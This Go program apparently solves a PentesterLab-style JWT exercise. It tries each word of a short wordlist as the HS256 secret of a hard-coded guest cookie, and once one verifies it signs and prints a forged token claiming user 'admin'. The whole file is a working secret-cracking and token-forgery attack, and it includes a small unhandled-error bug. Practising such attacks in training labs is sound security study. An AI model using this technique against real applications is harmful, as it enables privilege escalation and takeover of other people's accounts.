package main

import (
	"fmt"

	"github.com/golang-jwt/jwt/v4"
)

func createAndSignNewJWTToken(jwtKey string) (string, error) {
	// Create a new token object, specifying signing method and the claims
	// you would like it to contain.
	token := jwt.NewWithClaims(jwt.SigningMethodHS256, jwt.MapClaims{
		"user": "admin",
	})

	// Sign and get the complete encoded token as a string using the secret
	tokenString, err := token.SignedString([]byte(jwtKey))

	if err != nil {
		return "", err
	}

	return tokenString, nil
}

func main() {

	// Guest user cookie is
	guestUserCookie := "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjpudWxsfQ.Tr0VvdP6rVBGBGuI_luxGCOaz6BbhC6IxRTlKOW8UjM"

	// Header { "typ": "JWT" , "alg" : "HS256"}
	// Payload { "user" : null}

	var wordlist = [...]string{
		"hacker",
		"jwt",
		"insecurity",
		"pentesterlab",
		"hacking",
	}

	// Brute forcing the right jwtKey by trying to verify which word would verify the validity of our token
	for i := 0; i < len(wordlist); i++ {
		token, err := jwt.Parse(guestUserCookie, func(token *jwt.Token) (interface{}, error) {
			if _, ok := token.Method.(*jwt.SigningMethodHMAC); !ok {
				return nil, fmt.Errorf("unexpected signing method: %v", token.Header["alg"])
			}

			return []byte(wordlist[i]), nil
		})
		if claims, ok := token.Claims.(jwt.MapClaims); ok && token.Valid {
			// This is the correct secret key
			secret_key := wordlist[i]
			fmt.Println("The secret key is: ", secret_key)
			fmt.Println(claims)

			// Generating admin token
			adminAuthCookie, err := createAndSignNewJWTToken(secret_key)
			if err != nil {
				fmt.Errorf("unexpected error: %v", err)
				break
			}
			fmt.Println("Admin cookie is: ", adminAuthCookie)
			break
		} else {
			fmt.Println(err)
		}
	}
}
